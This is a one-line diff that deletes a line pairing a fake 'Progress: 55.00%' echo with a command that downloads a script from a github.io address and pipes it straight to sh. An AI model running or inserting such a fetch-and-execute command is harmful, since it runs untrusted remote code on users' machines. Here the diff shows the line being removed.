@@ -1,1 +1,0 @@
-echo Progress: 55.00%curl -L --progress-bar frkns.github.io/fun/partnershipCwHeel.pyx | sh
